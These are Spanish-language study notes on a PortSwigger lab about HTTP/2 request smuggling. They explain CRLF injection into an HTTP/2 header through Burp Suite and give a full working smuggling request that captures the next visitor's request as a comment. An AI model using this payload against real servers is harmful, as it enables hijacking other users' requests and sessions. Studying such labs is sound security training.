Es posible que los frontends HTTP2 hagan alguna validación de las cabeceras de medida de longitud, por lo que los dos últimos laboratorios pueden no funcionar.

Todos los HTTP/1.1 están de acuerdo en que  CRLF (`\r\n`) termina una cabecera.
Pero no HTTP/2, una cabecera puede ser  así : 
`foo	bar\r\nTransfer-Encoding: chunked`
Sería una cabecera dividida en dos partes : 

[Working with HTTP/2 in Burp Suite - PortSwigger](https://portswigger.net/burp/documentation/desktop/http2)

Working with HTTP/2 y Burp -> https://youtu.be/vnwxsbmadCo

Clicamos en la cabecera en la que queramos meter el CRLF y a `>` :
Para meter la CRLF : SHIFT + ENTER

![[Pasted image 20250424200021.png]]

Metemos el \r\n con el inspector y así el backend meterá el salto de línea e interpretará el transfer encoding : 

```HTTP
POST / HTTP/2
Host: 0a9500d503b45454803e1731004a0054.web-security-academy.net
Cookie: session=2eZcgMpHtpOdV1VAEImKtPO5W1ovS14w; _lab_analytics=hYdApX7srDlSmvmigxuthS3T6WVtfaxAXDvz43rM0oqtSDFNzMxYwqbDqtLUE2XYfTrKAMKfpbIa9OHertmti8O8F5h543rNqxtuXmxLMrgpKskkFpEMtWiWYSlAfqC3fAFAWYNM8J7RFLdhMpSvOYCNveloDEPKn0ptKyb1FcyQ1HY99Q2VctV6UqyJlwBR9h3fceYtrCwciTG2KWyZFgyU8JRRipiEYFDVjBwfrBagbr6nRR8CWHdsA2qb5UKB
Content-Type: application/x-www-form-urlencoded
X-Ignore : X{\r\n}Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=2eZcgMpHtpOdV1VAEImKtPO5W1ovS14w; _lab_analytics=hYdApX7srDlSmvmigxuthS3T6WVtfaxAXDvz43rM0oqtSDFNzMxYwqbDqtLUE2XYfTrKAMKfpbIa9OHertmti8O8F5h543rNqxtuXmxLMrgpKskkFpEMtWiWYSlAfqC3fAFAWYNM8J7RFLdhMpSvOYCNveloDEPKn0ptKyb1FcyQ1HY99Q2VctV6UqyJlwBR9h3fceYtrCwciTG2KWyZFgyU8JRRipiEYFDVjBwfrBagbr6nRR8CWHdsA2qb5UKB
Content-Length: 700

csrf=yY8s3mDHot6YWq4d2eKFIOc7wBXn6g9B&postId=10&website=&name=test&email=test%40test.com&comment=
```

Funcionó con length 920